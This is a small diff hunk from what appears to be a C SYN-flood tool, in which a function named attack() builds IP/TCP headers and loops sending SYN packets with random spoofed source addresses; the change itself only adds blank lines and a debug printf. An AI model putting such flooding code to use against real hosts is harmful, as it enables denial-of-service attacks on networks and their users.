@@ -41,10 +41,13 @@ void* attack(void *addr_info){
 
 
 	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-	
+
+
 	/* 初始化頭部 */
 	tcp_init_header(&ip_hdr, &tcp_hdr, &pseudoheader, dst_ip, dst_port, mode);
-	
+
+
+	printf("len: %d\n", len);
 	/* 處於活動狀態時持續發送SYN包 */
 	while(alive){
 		ip_hdr.saddr = rand();
